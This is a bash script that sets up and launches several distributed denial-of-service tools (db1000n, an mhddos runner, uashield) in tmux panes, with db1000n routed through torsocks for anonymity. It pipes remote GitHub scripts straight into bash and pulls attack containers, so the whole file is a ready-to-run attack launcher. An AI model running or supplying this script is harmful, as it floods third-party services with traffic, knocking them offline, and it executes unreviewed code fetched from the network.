#!/bin/bash
sudo apt-get update -y
sudo apt-get install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
pip install --upgrade pip

tmux kill-session -t multiddos
sudo pkill node
cd ~
mkdir multiddos
cd multiddos
curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
if [ ! -f "/usr/local/bin/gotop" ]; then
    wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
    sudo dpkg -i gotop_3.0.0_linux_amd64.deb
fi
rm *.tar.gz

tmux new-session -s multiddos -d 'gotop -asc solarized'
tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
#tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
tmux split-window -v 'torsocks -i ./db1000n'
#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
tmux attach-session -t multiddos
